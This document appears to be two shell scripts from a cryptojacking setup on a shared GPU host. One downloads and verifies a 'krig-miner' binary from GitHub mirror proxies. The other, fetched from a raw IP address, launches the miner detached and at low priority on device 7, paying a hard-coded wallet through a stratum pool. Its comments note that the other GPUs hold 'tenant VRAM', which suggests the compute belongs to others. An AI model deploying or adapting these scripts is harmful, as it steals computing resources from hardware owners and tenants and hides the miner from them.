#!/bin/bash
cd /opt/t19
SHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
URLS="https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"
for U in $URLS; do
  echo "TRY $U $(date -u +%T)"
  curl -fL -m 1200 --retry 2 -o /opt/t19/krig.tar.gz "$U"
  H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
  echo "GOT $H size=$(stat -c%s /opt/t19/krig.tar.gz 2>/dev/null)"
  [ "$H" = "$SHA" ] && { echo SHA_OK; break; }
done
H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
if [ "$H" = "$SHA" ]; then
  mkdir -p /opt/t19/krig && tar xzf /opt/t19/krig.tar.gz -C /opt/t19/krig
  chmod -R +x /opt/t19/krig 2>/dev/null
  find /opt/t19/krig -maxdepth 3 | head -30
  BIN=$(find /opt/t19/krig -type f -name 'krig-miner*' | head -1)
  echo "BIN=$BIN"
  [ -n "$BIN" ] && "$BIN" --help 2>&1 | head -70
  echo KRIG_READY
fi
echo KRIG_DL_DONE

===== http://123.184.7.135:8090/boot_krig.sh.orig
#!/bin/sh
# t19 pearl plant supervisor: maintains device 7 only.
# Devices 0-6 hold 74-81 GB of tenant VRAM each; krig pearlhash needs ~8.2 GB and
# trips CUDA_ERROR_OUT_OF_MEMORY, so they are intentionally not retried here.
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
B=/opt/t19/krig/krig-miner
L=/opt/t19/log
mkdir -p "$L"
cd /opt/t19/krig 2>/dev/null || exit 1
alive() {
  for p in /proc/[0-9]*; do
    c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null)
    case "$c" in *krig-miner*"$1"*) return 0;; esac
  done
  return 1
}
I=${T19_DEVICES:-7}
for i in $I; do
  WN="ul-t19-123-184-7-135-g$i"
  if alive "$WN"; then continue; fi
  setsid nohup nice -n 19 "$B" --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u "$W/$WN" -p x -d "$i" --no-tui -l info --log-file "$L/g$i.log" >>"$L/boot.log" 2>&1 &
  sleep 2
done

